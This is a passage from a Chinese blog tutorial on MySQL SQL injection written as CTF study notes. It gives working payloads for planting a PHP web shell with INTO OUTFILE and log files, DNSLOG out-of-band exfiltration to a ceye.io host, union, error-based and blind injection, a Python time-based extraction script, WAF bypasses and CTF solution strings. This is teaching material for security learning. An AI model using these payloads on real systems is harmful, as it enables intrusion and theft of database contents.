+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> mysql.m1;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> mysql.m1 (code <span class="built_in">TEXT</span> );</span><br><span class="line"><span class="keyword">LOAD</span> <span class="keyword">DATA</span> <span class="keyword">LOCAL</span> <span class="keyword">INFILE</span> <span class="string">'D://1.txt'</span> <span class="keyword">INTO</span> <span class="keyword">TABLE</span> mysql.m1 <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">''</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> mysql.m1;</span><br></pre></td></tr></table></figure>
+
+<h3 id="写"><a href="#写" class="headerlink" title="写"></a>写</h3><p>说完了读文件，那我们来说说mysql的写文件操作。常见的写文件操作如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="string">"&lt;?php @assert($_POST['t']);?&gt;"</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'/var/www/html/1.php'</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="number">2</span>,<span class="string">"&lt;?php @assert($_POST['t']);?&gt;"</span> <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'/var/www/html/1.php'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>限制：</p>
+<ul>
+<li><code>secure-file-priv</code>无值或为可利用的目录</li>
+<li>需知道目标目录的绝对目录地址</li>
+<li>目标目录可写，mysql的权限足够。</li>
+</ul>
+<h4 id="日志法"><a href="#日志法" class="headerlink" title="日志法"></a>日志法</h4><p>&emsp;&emsp;由于mysql在5.5.53版本之后，<code>secure-file-priv</code>的值默认为<code>NULL</code>，这使得正常读取文件的操作基本不可行。我们这里可以利用mysql生成日志文件的方法来绕过。</p>
+<p>mysql日志文件的一些相关设置可以直接通过命令来进行：</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//请求日志</span></span><br><span class="line">mysql&gt; <span class="keyword">set</span> global <span class="comment">general_log_file =</span> <span class="comment">'/var/www/html/1.php'</span>;</span><br><span class="line">mysql&gt; <span class="keyword">set</span> global <span class="comment">general_log = on</span>;</span><br><span class="line"><span class="comment">//慢查询日志</span></span><br><span class="line">mysql&gt; <span class="keyword">set</span> global <span class="comment">slow_query_log_file=</span><span class="comment">'/var/www/html/2.php'</span></span><br><span class="line">mysql&gt; <span class="keyword">set</span> <span class="comment">global slow_query_log=1</span>;</span><br><span class="line"><span class="comment">//还有其他很多日志都可以进行利用</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>之后我们在让数据库执行满足记录条件的恶意语句即可。</p>
+<p>限制：</p>
+<ul>
+<li>权限够，可以进行日志的设置操作</li>
+<li>知道目标目录的绝对路径</li>
+</ul>
+<h2 id="DNSLOG带出数据"><a href="#DNSLOG带出数据" class="headerlink" title="DNSLOG带出数据"></a>DNSLOG带出数据</h2><p>&emsp;&emsp;什么是DNSLOG？简单的说，就是关于特定网站的DNS查询的一份记录表。若A用户对B网站进行访问/请求等操作，首先会去查询B网站的DNS记录，由于B网站是被我们控制的，便可以通过某些方法记录下A用户对于B网站的DNS记录信息。此方法也称为OOB注入。</p>
+<p>如何用DNSLOG带出数据？若我们想要查询的数据为：<code>aabbcc</code>，那么我们让mysql服务端去请求<code>aabbcc.evil.com</code>，通过记录<code>evil.com</code>的DNS记录，就可以得到数据：<code>aabbcc</code>。</p>
+<blockquote>
+<p><a href="https://img.0x002.com/article/MysqlSQLi/dnslogSQLi.jpg" target="_blank" rel="noopener"><img src="https://img.0x002.com/article/MysqlSQLi/dnslogSQLi.jpg" alt="DNSLOG流程图"></a></p>
+<p>引自：<a href="https://www.anquanke.com/post/id/98096" target="_blank" rel="noopener">Dnslog在SQL注入中的实战</a></p>
+</blockquote>
+<p>payload: <code>load_file(concat(&#39;\\\\&#39;,(select user()),&#39;.xxxx.ceye.io\xxxx&#39;))</code></p>
+<p>应用场景：</p>
+<ul>
+<li>三大注入无法使用</li>
+<li>有文件读取权限及<code>secure-file-priv</code>无值。</li>
+<li>不知道网站/目标文件/目标目录的绝对路径</li>
+<li>目标系统为Windows</li>
+</ul>
+<p>推荐平台：<a href="http://ceye.io/" target="_blank" rel="noopener">ceye.io</a></p>
+<p>&emsp;&emsp;为什么Windows可用，Linux不行？这里涉及到一个叫UNC的知识点。简单的说，在Windows中，路径以<code>\\</code>开头的路径在Windows中被定义为UNC路径，相当于网络硬盘一样的存在，所以我们填写域名的话，Windows会先进行DNS查询。但是对于Linux来说，并没有这一标准，所以DNSLOG在Linux环境不适用。注：payload里的四个<code>\\\\</code>中的两个<code>\</code>是用来进行转义处理的。</p>
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>了解了最基本的Mysql相关知识后，我们来看看本文章的主题：SQL注入</p>
+<p>&emsp;&emsp;大部分情况下我们的SQL注入都是在<strong>查</strong>上面去注入，以获取数据库中的敏感信息。而<strong>查</strong>我们大致上分为三种，分别是有回显的<strong>联合查询注入</strong>、无回显的<strong>报错注入</strong>和布尔、时间<strong>盲注</strong></p>
+<p>&emsp;&emsp;三种注入方式利用起来原理并不是太难，但是注入的一生之敌：waf，总是让我们难以成功实现攻击。截至目前俺这个弟弟审过的两三个小众CMS，它们用的比较多的还是黑名单过滤，并且是在全局范围内直接对你所有传的参数【GET POST…】进行过滤，狠的一批，但是要是找到了未顾及的点，那就能给他日透咯。所以各种花里胡哨的payload，各种奇技淫巧也是因这越来越严密的waf而生。（就像游戏不停的推动着显卡升级一样嘛）</p>
+<h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><p>联合查询注入需要注意的是：</p>
+<ul>
+<li>若回显仅支持一行数据的话，记得<strong>让前边正常的查询语句返回的结果为空</strong>。</li>
+<li>使用union select进行拼接时，注意<strong>前后两个select语句的返回的字段数必须相同</strong>，否则无法拼接。</li>
+</ul>
+<p>再来看看联合查询注入的最基础四步</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">database</span>()	   <span class="comment">#查询数据库名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema= <span class="keyword">database</span>()		<span class="comment">#查询表名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'f1l1l1l1g'</span> 	<span class="comment">#查询表对应的列名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> flaaaaaag <span class="keyword">from</span> f1l1l1l1g 	<span class="comment">#查询列内容</span></span><br></pre></td></tr></table></figure>
+
+<p>但在这之前还需要用order by查一下字段数，</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span> = <span class="number">1</span>' order <span class="keyword">by</span> <span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>止到报错之前的那个数字就是字段数了。</p>
+<p>这里再补充一下information_schema相关的知识</p>
+<p>information_schema简介</p>
+<p>&emsp;&emsp;在版本大于等于5.0的MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。</p>
+<p>其中我们需要关注的是，<strong>information_schema</strong>的数据库里的<strong>shemata</strong>数据表查询<strong>全部数据库名</strong></p>
+<p><strong>tables</strong>的数据表中存着全部的<strong>数据表信息</strong>。其中，<strong>table_name 字段保存其名称</strong>，<strong>table_schema保存其对应的数据库名</strong>。</p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h4><p>适用版本：5.5.5~5.5.49</p>
+<p>&emsp;&emsp;报错注入有联动exp和~的，在Mysql里头，exp就是取e的幂次, ~就是按位取反。当exp里头的值太大了，就会造成大整数溢出，从而报错。</p>
+<p><code>select exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));</code></p>
+<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><p>函数语法：updatexml(XML_document, Xpath_string, new_value);</p>
+<p>适用版本: 5.1.5+<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值</p>
+<p>我们通常在第二个Xpath参数填写我们要查询的内容。</p>
+<p>与exp()不同，updatexml是由于参数的格式不正确而产生的错误，同样也会返回参数的信息。</p>
+<p>payload:</p>
+<p>前后添加~使其不符合Xpath格式从而报错。<br><code>updatexml(1,concat(0x7e,(select user()),0x7e),1)</code></p>
+<p><code>updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</code></p>
+<p>通过查询@@version,返回版本。然后CONCAT将其字符串化。因为UPDATEXML第二个参数需要Xpath格式的字符串,所以不符合要求，然后报错。</p>
+<p>错误大概会是：<br>ERROR 1105 (HY000): XPATH syntax error: ’:root@localhost’<br>另外，updatexml最多只能显示32位，需要配合substr【用法：substr(string,start,length)】使用。</p>
+<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><p>函数语法：<code>EXTRACTVALUE (XML_document, XPath_string);</code></p>
+<p>适用版本：5.1.5+</p>
+<p>利用原理与updatexml函数相同</p>
+<p>payload: <code>and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</code></p>
+<h4 id="几何函数"><a href="#几何函数" class="headerlink" title="几何函数"></a>几何函数</h4><ul>
+<li>GeometryCollection：<code>id=1 AND GeometryCollection((select * from (select* from(select user())a)b))</code></li>
+<li>polygon()：<code>id=1 AND polygon((select * from(select * from(select user())a)b))</code></li>
+<li>multipoint()：<code>id=1 AND multipoint((select * from(select * from(select user())a)b))</code></li>
+<li>multilinestring()：<code>id=1 AND multilinestring((select * from(select * from(select user())a)b))</code></li>
+<li>linestring()：<code>id=1 AND LINESTRING((select * from(select * from(select user())a)b))</code></li>
+<li>multipolygon() ：<code>id=1 AND multipolygon((select * from(select * from(select user())a)b))</code></li>
+</ul>
+<h4 id="不存在的函数"><a href="#不存在的函数" class="headerlink" title="不存在的函数"></a>不存在的函数</h4><p>随便适用一颗不存在的函数，可能会得到当前所在的数据库名称。</p>
+<p><a href="https://img.0x002.com/article/MysqlSQLi/noExit.png" target="_blank" rel="noopener"><img src="https://img.0x002.com/article/MysqlSQLi/noExit.png" alt="不存在的函数报错"></a></p>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="布尔"><a href="#布尔" class="headerlink" title="布尔"></a>布尔</h4><p>&emsp;&emsp;对于布尔盲注来说，其使用的场景在于：<strong>对真/假条件返回的内容很容易区分</strong>。</p>
+<p>&emsp;&emsp;比如说，有这么一条正常的select语句，我们再起where条件后边加上and 1=2，我们知道，1永远不等于2，那么这个条件就是一个永假条件，我们使用and语句连上，那么整个where部分就是永假的，这时候select语句是不会返回内容的。将其返回的内容与正常页面进行对比，如果很容易区分的话，那么布尔盲注试用。</p>
+<p>payload：<code>(where | and) if(substr((select password from users where username=&#39;admin&#39;),1,1)=&#39;a&#39;,1,0)</code></p>
+<h4 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h4><p>&emsp;&emsp;相比较于布尔盲注，时间盲注依赖于通过<strong>页面返回的延迟时间</strong>来判断条件是否正确。</p>
+<p>使用场景：布尔盲注永假条件所返回的内容与正常语句返回的内容很接近/相同，无法判断情况。</p>
+<p>简单的来说，时间盲注就是，如果我们自定义的条件为假的话，我们让其0延迟通过，如果条件为真的话，使用sleep()等函数，让sql语句的返回产生延迟。</p>
+<p>payload：<code>（where | and）if(substr((select password from users where username=&#39;admin&#39;),1,1)=&#39;a&#39;,sleep(3),1)</code></p>
+<p>&emsp;&emsp;由于盲注是需要大量的测试比较多的数据，所以一般盲注都是写脚本的。不然一个一个手工盲测费时费力。</p>
+<p>下面是时间盲注脚本的一个示例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">table=<span class="string">"abcdefghijklmnopqrstuvwxyz_&#123;&#125;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">        ss = time.time()</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">'''ELT(left((select database()),&#123;&#125;)='&#123;&#125;&#123;&#125;',SLEEP(10))'''</span>.format(len(flag)+<span class="number">1</span>,flag, i)</span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        print(r.text)</span><br><span class="line">        <span class="comment">#print(time.time()-ss)</span></span><br><span class="line">        <span class="keyword">if</span> time.time()-ss&gt;=<span class="number">10</span>:</span><br><span class="line">            flag += i</span><br><span class="line">            <span class="keyword">print</span> (flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>除了三种注入，其实还有一些不常见的注入</p>
+<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>&emsp;&emsp;什么是二次注入？简单的说，就是攻击者构造的恶意payload首先会被服务器存储在数据库中，在之后取出数据库在进行SQL语句拼接时产生的SQL注入问题。</p>
+<p>举个例子，某个查询当先登录的用户信息的SQL语句如下：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">username</span>=<span class="string">'$_SESSION['</span>username']'</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;登录/注册处的SQL语句都经过了addslashes函数、单引号闭合的处理，且无编码产生的问题。</p>
+<p>&emsp;&emsp;对于上述举的语句我们可以先注册一个名为<code>admin&#39; #</code>的用户名，因为在注册进行了单引号的转义，故我们并不能直接进行insert注入，最终将我们的用户名存储在了服务器中，注意：反斜杠转义掉了单引号，在mysql中得到的数据并没有反斜杠的存在。</p>
+<p>&emsp;&emsp;在我们进行登录操作的时候，我们用注册的<code>admin&#39; #</code>登录系统，并将用户部分数据存储在对于的SESSION中，如<code>$_SESSION[&#39;username&#39;]</code>。</p>
+<p>&emsp;&emsp;上述的<code>$_SESSION[&#39;username&#39;]</code>并没有经过处理，直接拼接到了SQL语句之中，就会造成SQL注入，最终的语句为：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">username</span>=<span class="string">'admin'</span> #'</span><br></pre></td></tr></table></figure>
+
+<p>常见注入方式的基础原理讲完了，接下来就讲讲，怎么去绕过一些考虑不周到的过滤。</p>
+<h3 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h3><p>过如遇到替换为空的情况，且不是递归检查，就可以用双写绕过</p>
+<p>利用&amp;&amp;、||可以代替and和or，+号，</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">'||1='<span class="number">1</span>     <span class="meta">#or</span></span><br><span class="line">'&amp;&amp;1='<span class="number">1</span>     <span class="meta">#and</span></span><br></pre></td></tr></table></figure>
+
+<p>注释(/**/)可以代替空格，%09, %0a, %0b, %0c, %0d, %a0等部分不可见字符可也代替空格</p>
+<p>如：<code>select * from user where username=&#39;admin&#39;union(select+title,content/**/from/*!article*/where/**/id=&#39;1&#39;and!!!!~~1=1)</code></p>
+<p>逗号被过滤：substr(data from 1 for 1)相当于substr(data,1,1)、limit 9 offset 4相当于limt 9,4</p>
+<p>主要思路就使用同义函数/语句代替，如if函数可用case when condition then 1 else 0 end语句代替。</p>
+<p>如果单独过滤union,使用盲注来获取数据</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'and substr((<span class="name">select</span> pass from users limit <span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)='s</span><br></pre></td></tr></table></figure>
+
+<h3 id="一些小Trick"><a href="#一些小Trick" class="headerlink" title="一些小Trick"></a>一些小Trick</h3><p>这里跟大家分享一些有意思的Trick，主要在一些CTF题出现，这里也把它记下来，方便复习。</p>
+<h4 id="PHP-union-select-ig绕过。"><a href="#PHP-union-select-ig绕过。" class="headerlink" title="PHP/union.+?select/ig绕过。"></a>PHP<code>/union.+?select/ig</code>绕过。</h4><p>在某些题目中，题目禁止union与select同时出现时，会用此正则来判断输入数据。</p>
+<ul>
+<li>利用点：<a href="https://bugs.php.net/bug.php?id=70699" target="_blank" rel="noopener">PHP正则回溯BUG</a></li>
+<li>具体分析文章：<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">PHP利用PCRE回溯次数限制绕过某些安全限制</a></li>
+</ul>
+<blockquote>
+<p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限<code>pcre.backtrack_limit</code>。若我们输入的数据使得PHP进行回溯且此数超过了规定的回溯上限此数(默认为 100万)，那么正则停止，返回未匹配到数据。</p>
+</blockquote>
+<p>故而我们构造payload：<code>union/*100万个a，充当垃圾数据*/select</code>即可绕过正则判断。</p>
+<p>一道相关的CTF题：<a href="https://github.com/MrR3boot/CTF/tree/master/TetCTF-2020" target="_blank" rel="noopener">TetCTF-2020 WP BY MrR3boot</a></p>
+<h4 id="LIMIT之后的字段数判断"><a href="#LIMIT之后的字段数判断" class="headerlink" title="LIMIT之后的字段数判断"></a>LIMIT之后的字段数判断</h4><p>我们都知道若注入点在where子语句之后，判断字段数可以用<code>order by</code>或<code>group by</code>来进行判断，而<code>limit</code>后可以利用 <code>into @,@</code> 判断字段数，其中@为mysql临时变量。</p>
+<p><a href="https://img.0x002.com/article/MysqlSQLi/limitInto.png" target="_blank" rel="noopener"><img src="https://img.0x002.com/article/MysqlSQLi/limitInto.png" alt="img"></a></p>
+<h3 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h3><p>[极客大挑战 2019]EasySQL【万能密码】</p>
+<p><code>admin&#39; or 1=1 #</code></p>
+<p>[极客大挑战 2019]loveSQL【基础联合注入】</p>
+<p><code>?username=1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&amp;password=1</code></p>
+<p>[极客大挑战 2019]babySQL【双写绕过】</p>
+<p><code>?username=admin&amp;password=admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(passwoorrd)%20frfromom%20b4bsql%23</code></p>
+<p>PS：这么看来想要注入，我们必须要用到单引号或者双引号来逃逸字符串，所以只过滤引号就能防住SQL注入了么？并不是，这里有一个例子</p>
+<p>&emsp;&emsp;如果你只是过滤了单引号，按照你上面的sql语句【<code>String sql=&quot;select * from user_table where username=&#39;&quot;+name+&quot;&#39; and password=&#39;&quot;+password+&quot;&#39;&quot;;</code>】，依然是可以注入的。</p>
+<p>&emsp;&emsp;username这样输入：<code>1\</code></p>
+<p>&emsp;&emsp;password这样输入：<code>or 1=1;#</code></p>
+<p>&emsp;&emsp;经过你的程序之后sql语句变成这样select * from user_table where username=’1&#39; and password=’or 1=1;#’; 在这里，username中输入的\转义了它后面的单引号，因此sql语句实际上变成 username的值等于这样一个字符串： 1’ and password=，后面我再接or 1=1;#就生效了，</p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 643713081@qq.com </span>
+    </div>
+</article>
+
+
+<p>
+    <a  class="dashang" onclick="dashangToggle()">赏</a>
+</p>
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>Web学习笔记 之 SQL注入</p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">4.2k</span></p>
+    <p><span class="copy-title">本文作者:</span><a  title="Van1sh">Van1sh</a></p>
+    <p><span class="copy-title">发布时间:</span>2020-08-07, 13:18:00</p>
+    <p><span class="copy-title">最后更新:</span>2020-08-12, 22:38:01</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/08/07/Web学习笔记 之 SQL注入/" title="Web学习笔记 之 SQL注入">http://jayxv.github.io/2020/08/07/Web学习笔记 之 SQL注入/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2020 Van1sh</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+<div class="acParent"></div>
+
+<div class="hide_box" onclick="dashangToggle()"></div>
+<div class="shang_box">
+    <a class="shang_close"  onclick="dashangToggle()">×</a>
+    <div class="shang_tit">
+        <p>喜欢就点赞,疼爱就打赏</p>
+    </div>
+    <div class="shang_payimg">
+        <div class="pay_img">
+            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
+            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
+        </div>
+    </div>
+    <div class="shang_payselect">
+        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
+    </div>
+</div>
+
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.0.1" ></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['@Van1sh','@FzWjScJ','#Write Up','#docker','#Sage','#ECC','#Paillier','#Web','#Files','#Serialization','#Rc4','#SM4','#Lattice','#Dsa','#LCG','#Knapsack','#Rsa','#SQL','#python','#Book','#操作模式','#number theory','#Abstract algebra','#XSS','#Nmap','#Coppersmith’s Method','#Linux','#book',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+        $("input[name=pay]").on("click", function () {
+            if($("input[name=pay]:checked").val()=="weixin"){
+                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
+            } else {
+                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
+            }
+        })
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+    function dashangToggle() {
+        $(".shang_box").fadeToggle();
+        $(".hide_box").fadeToggle();
+    }
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+        .nav .hide-list.fullscreen {
+            left: 492px
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("https://i.loli.net/2019/07/22/5d3521411f3f169375.png");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
